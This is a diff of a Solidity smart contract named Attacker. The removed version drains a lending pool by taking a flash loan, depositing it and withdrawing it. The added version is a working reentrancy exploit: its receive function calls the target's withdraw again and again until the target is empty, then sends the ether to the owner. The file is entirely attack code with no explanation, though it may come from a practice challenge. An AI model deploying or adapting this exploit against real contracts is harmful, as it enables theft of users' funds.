@@ -1,36 +1,40 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.11;
 
 interface IPool {
     function deposit() external payable;
     function withdraw() external;
-    function flashLoan (uint256 amount) external
-    ;
 }
 
 contract Attacker {
-    address immutable attacker;
-    IPool immutable pool;
+    IPool public immutable etherBank;
+    address private owner;
 
-    constructor (address _poolAddress) {
-        attacker = msg.sender;
-        pool = IPool(_poolAddress);
+    constructor(address etherBankAddress) {
+        etherBank = IPool(etherBankAddress);
+        owner = msg.sender;
     }
 
-    // 1. Check the balance of the pool
-    // 2. Borrow all the balance
-
-    function attack() external {
-        pool.flashLoan(address(pool).balance);
-        pool.withdraw();
+    function attack() external payable onlyOwner {
+        etherBank.deposit{value: msg.value}();
+        etherBank.withdraw();
     }
-    // 3. Deposit the borrowed money to the pool
 
-    function execute() external payable {
-        pool.deposit{value: msg.value}();
-    }
-    // 4. Withdraw all the money that was 'deposited' earlier
     receive() external payable {
-        payable(attacker).transfer(address(this).balance);
+        if (address(etherBank).balance > 0) {
+            etherBank.withdraw();
+        } else {
+            payable(owner).transfer(address(this).balance);
+        }
     }
+
+    // check the total balance of the Attacker contract
+    function getBalance() external view returns (uint) {
+        return address(this).balance;
+    }
+
+    modifier onlyOwner() {
+        require(owner == msg.sender, "Only the owner can attack.");
+        _;
+    } 
 }
